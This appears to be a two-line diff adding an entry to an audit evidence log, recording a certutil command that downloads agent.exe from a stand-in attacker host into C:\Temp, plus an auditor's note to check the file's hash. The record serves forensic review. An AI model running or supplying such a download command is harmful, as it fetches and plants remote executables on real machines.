@@ -1,0 +1,2 @@
+Evidence item 14, collected 2026-11-03: certutil -urlcache -split -f https://attacker.example/agent.exe C:\Temp\agent.exe
+Auditor follow-up: confirm the binary hash matches the vendor manifest.
